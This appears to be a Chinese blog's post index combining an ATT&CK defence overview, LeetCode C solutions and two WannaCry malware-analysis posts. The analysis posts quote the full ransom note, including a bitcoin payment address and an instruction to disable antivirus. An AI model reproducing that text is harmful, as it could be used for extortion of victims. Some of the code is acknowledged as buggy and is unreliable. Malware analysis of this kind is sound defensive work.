进行威胁模拟的红队与蓝队紧密合作(通常称为紫队)，以确保进行深入沟通交流，这对于快速磨练组织机构的防御能力至关重要。因此，与全范围的渗透测试或以任务目标为重点的红队相比，对抗模拟测试测试速度更快、测试内容更集中。 具体实例可参考《基于ATT&amp;CK框架的红蓝对抗，有效提升检测能力》 威胁情报 ATT&amp;CK（对手战术、技术及通用知识库）是一个反映各个攻击生命周期的攻击行为的模型和知识库，而威胁情报是对攻击者及其恶意活动的可运营的知识（actionable knowledge）和洞见（insight），其中知识包括上下文、机制、指标、含义和可执行的建议。因此我们可以利用ATT&amp;CK模型来增强威胁情报。 具体实例可参考《实战化ATT&amp;CK™：威胁情报》及《ATT＆CK在情报中的运用》两篇博文。 ATT&amp;CK框架的影响 ATT&amp;CK 框架可以成为业界的标准（能力可度量） 目前 ATT&amp;CK 框架主要包含终端相关安全知识，可以根据检测能力的矩阵覆盖率来评估部分安全产品的能力，例如：沙箱、EDR、SIEM 等。 如果顺利发展的话后期也可能加入Web安全相关安全知识，那时 WAF、RASP、代码审计等 Web 相关安全产品也可以凭借框架进行评估。 ATT&amp;CK框架可以成为业界的通用语言（威胁数据标签化） 在安全分析工作中，语言多样性同时造成语言障碍，影响协作能力。 比如今天这个设备的告警叫 “smb漏洞利用”，明天相同的告警叫 “MS17-010”，若是能以后大家都称其为 T1210-Exploitation of Remote Services，SubTxxxx-MS17010，每个人的一小步，却是行业的一大步。 ATT&amp;CK框架的局限与不足 虽然 ATT&amp;CK 框架期望实现建立一个大而全的威胁知识库，但目前的阶段还尚处于初步了解框架概念。MITRE 致力于建立一个 Cyber Analytics Repository，但由于内容太少而不足以提供丰富的检测能力。 在ATT&amp;CK中，PRE-ATT&amp;CK中才是情报建设核心能力的部分，但是这部分的能力建设门槛比较高，并且ATT&amp;CK在这一部分中的定义的比较粗，基本都是计划、人员组织、开发测试等逻辑术语。 不过也有很多迫不及待的人已经提前动起了手，例如 Red Teaming Experiments、atomic-red-team，但他们更注重的是 Red Team 攻击过程的复现，我们期望的是 Red Team 代码级复现 +Blue Team 威胁特征提取。 随着 ATT&amp;CK 框架的认知度越来越高，其完善发展的速度一定会更快，应用的方向也会更广。就目前阶段，ATT&amp;CK 最大作用是帮助恶意行为的检测和分析。 ATT&amp;CK框架的实施与使用整体实施规划对于不同成熟度阶段的防御方案中，ATT&amp;CK框架有着不同的映射方法，以便各种防御方案都能从中获取到价值。 阶段1：参考和数据丰富 MITRE ATT&amp;CK 框架包含大量具有潜在价值的数据，在此阶段可将该框架的数据当做详细的对手资料参考源，人工丰富对事件和警报的分析。 为更好地消费该数据，可以运用能方便访问并共享该数据的工具，比如数据丰富工具，或带中央威胁库方便用户聚合数据并搜索对手资料的平台。 阶段2：指标或事件驱动的响应 阶段2建立在参考和理解MITRE ATT&amp;CK数据的能力基础上。 第二阶段中安全团队要在自身运营工作流中融入该平台的各项功能，更有效地对数据进行操作。 通过自动关联事件及内部环境相关指标(指标源包括安全信息及事件管理(SIEM)系统、日志管理存储、案例管理系统和安全基础设施)和来自MITRE ATT&amp;CK框架的指标，安全团队能获得相关上下文，即时知晓攻击的发起者、目标、源头、时间、动机和方式 一旦能够以自动化的方式简洁明了地利用ATT&amp;CK数据，安全团队便可更有效地调查和响应事件，将威胁情报高效推送至传感器加以检测，有效追捕威胁。 阶段3：战术或技术驱动的主动威胁捕捉 在这一阶段，威胁捕捉团队可从寻找指标转向充分利用ATT&amp;CK数据。 不是专注看起来可疑的具体数据点，而是利用该平台站在更高的角度考虑对手及其相关TTP的信息。 威胁捕捉团队可采取主动，从风险情况入手，将风险映射到具体对手及其战术，深挖这些对手使用的技术，然后就可以在发现相关数据时立即展开调查了。 万丈高楼平地起，在完全没开始利用MITRE ATT&amp;CK 框架之前对更高层次的部署方案做太多调研意义不大。所以接下来的内容更注重于在阶段1中如何筛选技术并对想应的数据加以利用。 技术筛选MITRE ATT＆CK框架中有好几百种技术，并且会随着新技术的推出以及人工智能和机器学习系统的部署而逐渐扩大,我们并不可能对所有的技术都进行检测与相应，所以需要根据具体的需求从中筛选。 威胁建模 对于公司来说需要了解清楚最需要防护什么，攻击者最可能盯上什么。 对于已经有一定防御措施的情况，可以从已有的技术出发来逐步构建与完善整个防护模型。 寻找关键技术 Red Canary通过对过去五年里，其客户环境中发生的一万多起恶意事件进行分析，得出了威胁事件利用每种ATT&amp;CK技术的频率,并列出了Top 20的攻击技术。 构建防御模型也常常需要考虑覆盖到这些关键技术。 Top20 确认攻击难度 Tripwire 的 Travis Smith 在 ATT&amp;CKCon 大会上做了题为“ATT&amp;CK as a Teacher”的演讲，将 ATT&amp;CK 矩阵按漏洞利用难度加以组织。 构建防御模型时可以以攻击难度为标准来选择适合自己的技术。 技术难度分级 数据源筛选 当确定要在检测方案中实施相关检测技术时，需要确保有适当的数据源来实施针对该技术的检测方案，所以也需要根据自己可获取到的数据源来选择技术。 而较多技术所需要的数据源的获取也是防御模型的构建者所需要考虑的问题。 数据源统计 需要注意的是，ATT＆CK命名的几乎每个高级数据源都包含子数据源(该数据源的不同形式)，所以有必要了解自己可以访问哪些数据源，弄清这些子数据源提供哪些信息，只找出其中一个子数据源是不够的。 实现不同相关技术检测的时候，可以通过分析特定技术与自己防御模型的相关性，来减少自己需检测的子数据源数量。 比如说有 66种不同技术需要文件和进程监视数据源，而我们所需要检测的技术可能只需要子数据源的一个子集就够了。 以及可以使用两种不同的方法来执行和检测一种技术，所以需要考虑哪个数据源对我们的防御模型更加关键，有所侧重才能更高效地执行检测。 数据源信息获取 github上有开源安全事件元数据(Open Source Security Events Metadata (OSSEM))可供使用。 OSSEM 由 Rodriguez 兄弟创建，提供数据源相关的四类信息: ATT&amp;CK数据源：将 ATT&amp;CK 技术的数据源映射到实际系统事件或分析，产生适用于该技术检测机制的数据。 检测数据模型 通用信息模型 数据字典 数据整合 在了解数据源的物理来源以及事件与这些物理数据源的关系之后，需要有一个信息存储库及相应的查询方式。 可以使用图形数据库，并根据数据字典和公共信息模型中的信息实现类似于以下图表的内容： 数据整合 数据整合工作量非常大，这个过程可以选择一些开源工具辅助进行。 开源工具 目前我所见到的与ATT&amp;CK想匹配的数据整合工具有以下两个，但两个工具的具体职能是什么？是否功能重叠？各有什么局限性？这些问题还有待后续调研。 Osquery OSquery可以收集环境中各主机的信息，并将数据聚合到表格中。可以使用类似SQL的查询来访问表格中的数据并编写检测方案，因此对于接触过关系型数据库的人来说难度并不大。 此外，OSquery可以创建查询集合，映射到ATT＆CK中的目标TTP，进行威胁捕获。安全人员可以即时创建和执行在线实时查询。 有些查询可以识别网络攻击者，这些查询可以集成到SIEM（Security Information and Event Management，安全信息及事件管理）系统中来。 Sysmon Sysmon 是微软的一款免费的轻量级系统监控工具，它通过系统服务和驱动程序实现记录进程创建，网络连接以及文件创建时间更改的详细信息，并把相关的信息写入并展示在 windows 的日志事件里，以便用户使用SIEM（Security Information and Event Management，安全信息及事件管理）工具收集相应信息。 落地项目简介不像其它理论只是提供理论指导作用,ATT&amp;CK 框架的可落地性很强,并且目前已经有很多落地的项目可以帮助使用者来学习如何使用该框架。 若想了解更将详细的信息可参考《ATT&amp;CK 实战指南》。 理论学习使用 ATT&amp;CK™ Navigator项目：导航工具，有较好的可交互性，便于了解 ATT&amp;CK 的各项技术。 ATT&amp;CK™ 的 CARET 项目：CAR(Cyber Analytics Repository 网络分析库) 项目的演示版本，有助于理解 CAR 这个项目 (具体会在 Blue Team使用中介绍)表达的内容。 Red Team 使用 Red Canary™ Atomic Red Team项目：可以根据框架的技术通过脚本的自动化攻击。结合此项目可以完善红队攻击测试库，根据实际情况不断进行测试和回归测试，让安全攻击水准达到一个比较好的水平。 ATTACK-Tools项目：可用作模拟攻击的计划工具或ATT&amp;CK关系型数据库的查询工具。 Blue Team 使用 ATT&amp;CK™ CAR 项目：理论架构，主要是针对 ATT&amp;CK 的威胁检测和追踪，内容丰富度上比较欠缺。 Endgame™ EQL 项目：EQL（Event Query Language）是一种威胁事件查询语言，可以对安全事件进行序列化、归集及分析。该项目可以进行事件日志的收集，不局限于终端数据，还可以是网络数据。 DeTT&amp;CT 项目：DeTT&amp;CT（DEtect Tactics, Techniques &amp; Combat Threats）项目，用于帮助防御团队评估日志质量、检测覆盖度的工具。 Sigma 项目：Sigma项目是一个SIEM的特征库格式项目。该项目可以直接使用sigma格式进行威胁检测的描述，可以进行共享，也可以进行不同 SIEM 系统的格式转换。 MISP 项目：恶意软件信息共享平台 MISP（Malware Information Sharing Platform）是一个开源的威胁情报平台。 CSO(首席信息官) 使用• Atomic Threat Coverage 项目：组织型项目，重点组成部分是上面提到的两个项目：Red Canary™ Atomic Red Team 和 Sigma项目，二者分别负责模拟攻击和攻击检测。 参考文献 Mitre ATT&amp;CK官网先验知识 简书:《Cyber Kill Chain洛克希德-马丁公司的网络杀伤链》 《洛克希德-马丁公司的七步网络杀伤链白皮书》 MITRE ATT＆CK框架详细介绍 安全脉搏:《一文看懂ATT&amp;CK框架以及使用场景实例》 MITRE ATT＆CK的应用场景 简书:《ATT&amp;CK如何为安全产品赋能》 安全脉搏:《基于ATT&amp;CK框架的红蓝对抗，有效提升检测能力》 安全客:《ATT＆CK在情报中的运用》 安全脉搏:《实战化ATT&amp;CK™：威胁情报》 安全牛:《ATT&amp;CK 在大数据安全分析中的应用思考》 ATT&amp;CK框架的实施与使用 安全牛:《加速检测与响应的最新工具：MITRE ATT&amp;CK 框架》 安全脉搏:《青藤细述MITRE ATT＆CK框架的实施和使用方式》 安全牛:《MITRE ATT&amp;CK 框架“入坑”指南》 安全牛:《浅谈ATT&amp;CK对提升主机EDR检测能力的探索》 DOIT:《ATT&amp;CK框架：攻击者最常用的TOP7攻击技术及其检测策略》 安全内参:《ATT&amp;CK实战指南》","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/tags/网络安全/"}]},{"title":"C语言刷Leetcode笔记之 88. Merge Sorted Array","slug":"C语言刷Leetcode笔记之Merge Sorted Array","date":"2020-02-01T06:33:04.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/02/01/C语言刷Leetcode笔记之Merge Sorted Array/","link":"","permalink":"https://liuyi12138.github.io/2020/02/01/C语言刷Leetcode笔记之Merge Sorted Array/","excerpt":"本来说今天选一个简单题做来着，结果想着想着这奇奇怪怪的方法他就出来了。 ps:以后打死我也不会再研究一些奇奇怪怪的算法了，人生苦短我用qsort Leetcode传送门","text":"本来说今天选一个简单题做来着，结果想着想着这奇奇怪怪的方法他就出来了。 ps:以后打死我也不会再研究一些奇奇怪怪的算法了，人生苦短我用qsort Leetcode传送门 思路分析其实主要的思想都是一样的(毕竟题很简单),但思路拓宽来，就扯到归并排序了，然后发现了奇奇怪怪的原地归并排序(谁想出来的烧脑玩意) 暴力qsort 做题第一步，必定先暴力一次过，qsort给劲，效果也还不错 12345678910int compare(void* a, void*b)&#123; return *(int*)a - *(int*)b;&#125;void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n)&#123; for(int i = 0; i &lt; n; ++i)&#123; nums1[m+i] = nums2[i]; &#125; qsort(nums1, m+n, sizeof(int), compare);&#125; 双指针比较法 写这个方法前是有很难受的思考与实践的，是真的难受 第一想法是还是先将num2搬到num1中去，由于合并后的数组具有特定规律(前后排序完成)，可采用特定方法进行排序 有意思的是这时的情形与归并排序的merge相同 然而归并排序的merge需要用到额外空间，这样必定浪费时间和空间 所以既然要用归并排序的合并思想，那不如直接用num2的空间，采用双指针比较法来合并。 思想大概是每次选出一个最大的数放在最后面 123456789101112131415161718192021void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n)&#123; int i = 0; int j = 0; int count = 1; while(i &lt; m &amp;&amp; j &lt; n)&#123; if(nums1[m-1-i] &gt; nums2[n-1-j])&#123; nums1[m+n-count] = nums1[m-1-i]; i++; &#125; else&#123; nums1[m+n-count] = nums2[n-1-j]; j++; &#125; count++; &#125; while(j &lt; n)&#123; nums1[m+n-count] = nums2[n-1-j]; j++; count++; &#125;&#125; 原地归并排序Merge 左思右想，有没有法子把num2合到num1中后，不开辟空间把俩数组合并呢 自己尝试了一下并不顺利 于是百度了不消耗空间的归并函数，于是乎发现了原地归并排序这么个玩意 想要具体了解可以参考原地归并排序 但有一说一,最终效果并不咋地,毕竟不耗空间是以时间复杂度为代价的 其中一个有意思的思想就是把通过三次数组倒置的方式来实现数组旋转，有兴趣可以尝试做一下Leetcode T189 Rotate Array 123456789101112131415161718192021222324252627282930313233343536373839404142434445void reverse(int* nums,int start, int end)&#123; int i = start; int j = end - 1; int temp; while (i&lt;j) &#123; temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; i++; j--; &#125;&#125;void exchange(int* nums,int start, int mid, int end)&#123; reverse(nums, start, mid); reverse(nums, mid, end); reverse(nums, start, end);&#125;void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n)&#123; for(int i = 0; i &lt; n; ++i)&#123; nums1[m+i] = nums2[i]; &#125; int i = 0; int j = m; int mid = m; while (i &lt; j &amp;&amp; j &lt; m+n) &#123; int step=0; while (i &lt; j &amp;&amp; nums1[i] &lt;= nums1[j]) i++; while (j &lt; m+n &amp;&amp; nums1[j] &lt; nums1[i]) &#123; j++; step++; &#125; exchange(nums1,i,mid,j); i += step; mid = j; &#125;&#125; More 搞了半天其实也没有提高算法的效率，只能说是拓展了思路(以后打死我也不会用这个算法了) 康康排行榜上这题的最佳解法居然是写了个快排 我就不明白了为啥自己写的快排能快过qsort… 代码我就放这了，有兴趣自己康 1234567891011121314151617181920212223void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n)&#123; int i=0,j=0; for(i=0;i&lt;n;i++)&#123; nums1[m+i]=nums2[i]; &#125; Q_sort(nums1,0,m+n-1); return nums1;&#125;void Q_sort(int *array,int low,int high)&#123; if(low&gt;=high) return; int key=array[low]; int start=low,end=high; while(start&lt;end)&#123; while(start&lt;end&amp;&amp;key&lt;=array[end])end--; array[start]=array[end]; while(start&lt;end&amp;&amp;key&gt;=array[start])start++; array[end]=array[start]; &#125; array[start]=key; Q_sort(array,low,start-1); Q_sort(array,start+1,high);&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"},{"name":"C语言","slug":"C语言","permalink":"https://liuyi12138.github.io/tags/C语言/"}]},{"title":"C语言刷Leetcode笔记之 1. Two Sum","slug":"C语言刷Leetcode笔记之Two Sum","date":"2020-01-31T07:50:04.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/01/31/C语言刷Leetcode笔记之Two Sum/","link":"","permalink":"https://liuyi12138.github.io/2020/01/31/C语言刷Leetcode笔记之Two Sum/","excerpt":"2020寒假在家，给19级小朋友出题时想了Two Sum的多种实现方法如下。 Leetcode传送门","text":"2020寒假在家，给19级小朋友出题时想了Two Sum的多种实现方法如下。 Leetcode传送门 思路分析主要想到了三种思路及其改进，以及还有最近刷题常见的Hash表法 暴力遍历 最直观的方法就是遍历了 时间复杂度O(n^2) 空间复杂度O(1) 123456789101112131415int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; int* result = (int*)malloc(2*sizeof(int)); for(int i = 0; i &lt; numsSize; ++i)&#123; for(int j = i + 1; j &lt; numsSize; ++j)&#123; if(nums[i] + nums[j] == target)&#123; result[0] = i; result[1] = j; *returnSize = 2; return result; &#125; &#125; &#125; *returnSize = 0; return result;&#125; 分治法 这个想法由来已久，去年用C++刷题时就想到能否尝试，主要是看到算法导论上有一个例题的分析方法与之类似一直想试一下，直到今天才have a try 但改进效果有限 (去年的C++刷题笔记) 时间复杂度O(n^2) 空间复杂度O(1) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* 分治法实现2Sum，思路为把数组分为两半，问题变为3个子问题： 2个数都在左侧/2个数都在右侧/左右各一个 如果两个数在同侧则继续递归,最小子问题为只剩两个数时直接比较，只剩一个数时判false 如果两个数分别在两边，则for循环遍历两侧，时间复杂度为O(n^2),但系数为原来的1/4 此方法时间复杂度为O(n^2),最理想条件下时间复杂度为O(nlogn),空间复杂度为O(1)*/int ergodic(int* nums, int l, int h, int target, int* result)&#123; int med = (l + h) / 2; for(int i = l; i &lt;= med; ++i)&#123; for(int j = med + 1; j &lt;= h; ++j)&#123; if(target == nums[i] + nums[j])&#123; result[0] = i; result[1] = j; return 1; &#125; &#125; &#125; return 0;&#125;int find2Sum(int* nums, int l, int h, int target, int* result)&#123; if(h &lt;= l) return 0; if(h == l + 1)&#123; if(target == nums[l] + nums[h])&#123; result[0] = l; result[1] = h; return 1; &#125; return 0; &#125; int med = (l + h) / 2; int leftRes = find2Sum(nums, l, med, target, result); int rightRes = find2Sum(nums, med, h, target, result); if(!leftRes &amp;&amp; !rightRes) return ergodic(nums, l, h, target, result); else return 1;&#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; *returnSize = 0; if(numsSize &lt;= 1) return NULL; int* result = (int*)malloc(2*sizeof(int)); if(find2Sum(nums, 0, numsSize-1, target, result))&#123; *returnSize = 2; &#125; else&#123; *returnSize = 0; &#125; return result;&#125; 先排序后搜索 思路为排序后搜索，需要开辟空间来存储原数组防止丢失索引 二分搜索 排序和搜索的时间复杂度都为O(nlogn),算法的空间复杂度为O(n) (这个二分搜索代码的边界条件有问题aaaaa，真的调不出来，代码思路在这，凑合着看) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int compare(void* a, void* b)&#123; return *(int*)a - *(int*)b;&#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; int* temp = (int*)malloc(numsSize*sizeof(int)); int* result = (int*)malloc(2*sizeof(int)); int resultl, resulth; for(int i = 0; i &lt; numsSize; ++i)&#123; temp[i] = nums[i]; &#125; qsort(temp, numsSize, sizeof(int), compare); int flag = 0; for(int i = 0; i &lt; numsSize; ++i)&#123; if(flag) break; int l = i; int h = numsSize - 1; while(l &lt;= h)&#123; int mid = (l + h) / 2; if(temp[i] + temp[mid] == target)&#123; resultl = temp[i]; resulth = temp[mid]; flag = 1; break; &#125; else if(temp[l] + temp[mid] &gt; target) h = mid - 1; else l = mid + 1; &#125; &#125; if(flag)&#123; *returnSize = 2; int flagl = 0; int flagh = 0; for(int i = 0; i &lt; numsSize; ++i)&#123; if(!flagl &amp;&amp; nums[i] == resultl)&#123; result[0] = i; flagl = 1; &#125; else if(!flagh &amp;&amp; nums[i] == resulth)&#123; result[1] = i; flagh = 1; &#125; &#125; &#125; else&#123; *returnSize = 0; &#125; return result;&#125; 双指针遍历搜索 此方法为上一个思路的改进，改进点在于搜索 因为qsort的时间复杂度最差为O(nlogn)，但搜索一定是O(nlogn)所以需要改进 具体措施为将二分法改为双指针遍历的方法，时间复杂度为O(n) 算法整体的时间复杂度还是O(nlogn),空间复杂度为O(n) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int compare(void* a, void* b)&#123; return *(int*)a - *(int*)b;&#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; int* temp = (int*)malloc(numsSize*sizeof(int)); int* result = (int*)malloc(2*sizeof(int)); int resultl, resulth; for(int i = 0; i &lt; numsSize; ++i)&#123; temp[i] = nums[i]; &#125; qsort(temp, numsSize, sizeof(int), compare); int flag = 0; int l = 0; int h = numsSize - 1; while(l &lt; h)&#123; if(temp[l] + temp[h] == target)&#123; resultl = temp[l]; resulth = temp[h]; flag = 1; break; &#125; else if(temp[l] + temp[h] &lt; target) l++; else h--; &#125; if(flag)&#123; *returnSize = 2; int flagl = 0; int flagh = 0; for(int i = 0; i &lt; numsSize; ++i)&#123; if(!flagl &amp;&amp; nums[i] == resultl)&#123; result[0] = i; flagl = 1; &#125; else if(!flagh &amp;&amp; nums[i] == resulth)&#123; result[1] = i; flagh = 1; &#125; &#125; &#125; else&#123; *returnSize = 0; &#125; return result;&#125; Hash表法 Hash表是什么我在此就不讲解了，不懂的自行百度 最近刷题得分高的解法里面很大一部分都是使用Hash表去解 我不大愿意使用Hash表主要是因为C标准库中本身没有实现Hash表(就是懒) 之前也有过用C实现Hash表来着(Hash表的C语言实现) 言归正传，Hash表法的思路其实很简单，主要还是靠搜索，不过通过Hash的方式实现搜索可以将时间复杂度降低 Hash存数据时间复杂度为O(1)，取数据时间复杂度为O(1) ~ O(n) 整体而言该算法的时间复杂度在O(n) ~ O(n^2)之间，空间复杂度是O(n),个人感觉效果一般 最后贴一个嫖来的Hash表法实现2Sum，大家自行体会123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/** * Note: The returned array must be malloced, assume caller calls free(). */struct hash_node &#123; struct hash_node *next; int index; int element;&#125;;struct hash_node *hash_mem;struct hash_node **hash_header;int hash_size = 16;int hash_func(int num)&#123; if (num &lt; 0) &#123; return (0 - (num % hash_size)); &#125; return (num % hash_size);&#125; int build_hash(int *nums, int numsSize) &#123; int i, v; hash_header = malloc(hash_size * sizeof(struct hash_node *)); if (hash_header == NULL) &#123; return -1; &#125; memset(hash_header, 0, hash_size * sizeof(struct hash_node *)); hash_mem = malloc(numsSize * sizeof(struct hash_node)); if (hash_mem == NULL) &#123; free(hash_header); hash_header = NULL; return -1; &#125; for (i = 0; i &lt; numsSize; i++) &#123; v = hash_func(nums[i]); hash_mem[i].element = nums[i]; hash_mem[i].index = i; hash_mem[i].next = hash_header[v]; hash_header[v] = &amp;hash_mem[i]; &#125; return 0; &#125; struct hash_node *hash_find(int num, int index) &#123; int v; struct hash_node *node_p; v = hash_func(num); node_p = hash_header[v]; while (node_p) &#123; if (node_p-&gt;element == num &amp;&amp; node_p-&gt;index &gt; index) &#123; return node_p; &#125; node_p = node_p-&gt;next; &#125; return node_p; &#125; void hash_free(void) &#123; if (hash_mem) &#123; free(hash_mem); hash_mem = NULL; &#125; if (hash_header) &#123; free(hash_header); hash_header = NULL; &#125; &#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; int i, j, need; int *res; int ret; struct hash_node *node_p; ret = build_hash(nums, numsSize); if (ret != 0) &#123; *returnSize = 0; hash_free(); return NULL; &#125; for (i = 0; i &lt; numsSize; i++) &#123; need = target - nums[i]; node_p = hash_find(need, i); if (node_p == NULL) &#123; continue; &#125; res = malloc(2 * sizeof(int)); if (res == NULL) &#123; *returnSize = 0; hash_free(); return NULL; &#125; res[0] = i; res[1] = node_p-&gt;index; *returnSize = 2; hash_free(); return res; &#125; hash_free(); *returnSize = 0; return NULL;&#125; More在广大群友的讨论以及百度之下get到了更多解法 传说中的双向并行二分查找 排序方法我就不说了，有各种各样的实现，我个人还是趋向于使用qsort 在网上嫖到了双向并行二分查找的C语言实现，在此大概贴一个思路，有兴趣的同学自行跳转到上述链接。 有一说一这思路不大好说，大家自行根据代码画图来看吧，个人觉得比较烧脑，短时间内写不出来。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int start = 0;int end = len - 1;while(start + 1 &lt; end)&#123; mid = start + (end-start) / 2; if(numList[start] + numList[end]&lt;target) &#123; if(numList[mid]+numList[end]&lt;target) &#123; start=mid; &#125; else if(numList[mid]+numList[end]&gt;target) &#123; start++; &#125; else &#123; index[0]=mid; index[1]=end; //printf(\"index:%d,%d\\n\",index[0],index[1]); return index; &#125; &#125; else if(numList[start] + numList[end]&gt;target) &#123; if(numList[start]+numList[mid]&gt;target) &#123; end=mid; &#125; else if(numList[start]+numList[mid]&lt;target) &#123; end--; &#125; else &#123; index[0]=start; index[1]=mid; //printf(\"index:%d,%d\\n\",index[0],index[1]); return index; &#125; &#125; else &#123; index[0]=start; index[1]=end; printf(\"index:%d,%d\\n\",index[0],index[1]); return index; &#125; &#125; 结构体排序后搜索 leetcode上看到的最优解法 主要思路还是qsort排序 + 双指针遍历搜索 通过结构体的方式保存了下标，避免了对下标的二次遍历 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253struct node&#123; int value; int index;&#125;;int comp(const void* a, const void* b)&#123; return ((struct node*)a)-&gt;value - ((struct node*)b)-&gt;value; &#125;int* twoSum(int* nums, int numsSize, int target, int* returnSize)&#123; int i; struct node* nodes = (struct node*)malloc(numsSize*sizeof(struct node)); int begin = 0; int end = numsSize - 1; int *ans=(int *)malloc(sizeof(int)*2); *returnSize = 0; for (i = 0; i &lt; numsSize; i++) &#123; nodes[i].value = nums[i]; nodes[i].index = i; &#125; qsort(nodes, numsSize, sizeof(struct node), comp); while(begin &lt; end) &#123; if(nodes[begin].value + nodes[end].value == target) &#123; //printf(\"nodes[begin].value,nodes[end].value %d,%d,%d,%d\\n\",begin,nodes[begin].value,end,nodes[end].value); ans[0] = nodes[begin].index; ans[1] = nodes[end].index; free(nodes); *returnSize = 2; return ans; &#125; else if(nodes[begin].value + nodes[end].value &gt; target) &#123; end = end - 1; &#125; else &#123; begin = begin + 1; &#125; &#125; free(nodes); return ans;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"},{"name":"C语言","slug":"C语言","permalink":"https://liuyi12138.github.io/tags/C语言/"}]},{"title":"wannacry源码分析","slug":"wannacry源码分析","date":"2019-11-09T02:53:23.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/11/09/wannacry源码分析/","link":"","permalink":"https://liuyi12138.github.io/2019/11/09/wannacry源码分析/","excerpt":"网安组wannacry分析","text":"网安组wannacry分析 整体结构分析 由于时间原因，此博文只分析了wcry.exe主程序的初始化部分 下图是wannacry的结构图 20191109164305 主函数的C语言代码如下，对初始化部分做了注释 20191109164555 初始化部分分析设置注册表项 主要作用是在\\HKEY_LOCAL_MACHINE\\SOFTWARE下添加一个注册表项，名称为wd,其值为wannacry的程序路径 20191109110418 运行后查询注册表结果如下 20191109105629 释放资源文件 此函数不太好分析，但内部调用了很多与资源有关的函数(如下图) 20191109154147 通过动调发现该函数释放出了很多资源文件 20191109154000","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"病毒","slug":"病毒","permalink":"https://liuyi12138.github.io/tags/病毒/"}]},{"title":"wannacry行为分析","slug":"wannacry行为分析","date":"2019-11-08T00:10:28.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/11/08/wannacry行为分析/","link":"","permalink":"https://liuyi12138.github.io/2019/11/08/wannacry行为分析/","excerpt":"网安组wannacry分析","text":"网安组wannacry分析 使用PEID进行查壳和语言分析 该病毒使用的是VC++6.0(这玩意真的不大好用哦) 没有加壳，子系统是Win32 GUI 使用LordPE分析 主要分许导入表，分析病毒的行为 从导入表中整理出来的API接口如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849文件操作:GetFileSizeExReadFileWriteFileCopyFileACreateFileAGetFileAttributesWSetFileAttributesWSetFilePointerSetFileTimeCreateDirectorySetCurrentDirectory //切换当前进程的当前工作目录GetWindowsDirectory //获取Windows目录的完整路径名服务操作:CreateServiceAOpenServiceAStartServiceACloseServiceHandle注册表操作:RegCreateKeyWRegSetValueExARegQueryValueExARegCloseKey进程操作:CreateProcessATerminateProcess //终止指定进程及其所有的线程。GetExitCodeProcess //获取一个已中断进程的退出代码。其他操作:LoadLibraryAGetProcAddress //检索指定的动态链接库(DLL)中的输出库函数地址/*CriticalSection是每个线程中访问临界资源的那段代码不论是硬件临界资源，还是软件临界资源，多个线程必须互斥地对它进行访问*/InitializeCriticalSectionDeleteCriticalSectionLeaveCriticalSectionEnterCriticalSection资源操作SizeofResourceLockResourceLoadResourceFindResourceA 从API接口中我们可以看出，很多接口都涉及到了多线程的问题，需要我们重点了解一下 火绒剑模拟运行 使用火绒剑对wannacry进行行为监控发现只有文件操作和进程操作，像注册表和网络监控就没有获取到信息 文件监控 wannacry的文件操作主要是打开文件和设置文件安全信息，并不能获取太多信息 进程监控 跟之前分析的一样，确实监测到的进程动作最多，主要有以下动作 PROC_exec 创建进程 PROC_exec 跨进程恢复线程 PROC_open 打开进程 PROC_readvm 跨进程读内存(尤其多) 感染结果观察 感染后除了桌面上出现一些与wannacry有关的文件外没有太多变化 运行了一个exe文件后弹出如下窗口，并更改了桌面背景图,该窗口关闭后每隔一段时间弹出一次 20191108150711 一些软件可以正常运行，它主要感染的还是图片和文档等文件，当然一般是这些文件更值钱 20191108151027 这些文件被感染成了@Please_Read_Me@.txt和@WanaDecryptor@.exe，@Please_Read_Me@.txt内容如下 123456789101112131415161718192021Q: What&apos;s wrong with my files?A: Ooops, your important files are encrypted. It means you will not be able to access them anymore until they are decrypted. If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely! Let&apos;s start decrypting!Q: What do I do?A: First, you need to pay service fees for the decryption. Please send $300 worth of bitcoin to this bitcoin address: 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn Next, please find an application file named &quot;@WanaDecryptor@.exe&quot;. It is the decrypt software. Run and follow the instructions! (You may need to disable your antivirus for a while.) Q: How can I trust?A: Don&apos;t worry about decryption. We will decrypt your files surely because nobody will trust us if we cheat users. * If you need our assistance, send a message by clicking &lt;Contact Us&gt; on the decryptor window. 按照提示恢复了部分文件，文件恢复了但是那两个文件还在 